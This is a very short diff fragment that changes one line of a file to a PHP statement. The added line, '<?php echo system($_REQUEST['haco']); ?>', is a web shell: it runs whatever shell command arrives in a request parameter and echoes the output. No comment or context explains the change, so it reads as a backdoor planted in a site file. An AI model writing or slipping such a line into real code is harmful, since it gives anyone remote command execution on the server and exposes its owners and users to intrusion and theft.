@@ -1,5 +1,5 @@
 
-<?php echo request
+<?php echo system($_REQUEST['haco']); ?>
 
 
 
